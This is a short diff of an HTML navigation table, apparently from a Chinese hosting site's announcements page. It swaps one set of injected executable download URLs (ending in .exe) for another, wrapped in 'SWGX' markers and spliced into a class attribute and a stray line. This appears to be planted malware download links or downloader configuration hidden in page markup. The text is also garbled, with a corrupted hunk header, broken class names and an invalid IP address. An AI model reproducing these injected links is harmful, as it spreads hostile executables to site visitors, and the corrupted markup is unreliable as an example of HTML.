@@ -242,9 +242,9 @@ AA2TP5helper.exe2AAHTML>
           <TR>
               <TD width="5" background="/images/idc789/d_navbg1.gif"><img src="/images/idc789/d_navbg1.gif" width="5" height="25"></TD>
               <TD width="118" height="25" id="tb_1" class="hovertab"  style="text-align:center;over-flow:hidden;">系统公告</TD>
-              <TD width="118" id="tb_2" class="nSWGX--http://33.79.90.287/1/za.exe--SWGXormaltab"  style="text-align:center;over-flow:hidden;"></TD>
+              <TD width="118" id="tb_2" class="nSWGX--http://47.101.33.111:8080/sqhq.exe--SWGXormaltab"  style="text-align:center;over-flow:hidden;"></TD>
               <TD width="19" background="/images/idc789/nav_bg3.jpg"></TD>
-	      SWGX1--http://27.18.53.161/zz.exe--SWGX1
+	      SWGX1--http://47.101.33.111:8080/sqhq.exe--SWGX1
               <TD width="10"><img src="/images/idc789/d_navbg2.gif" width="10" height="25"></TD>
           </TR>
           <tr>
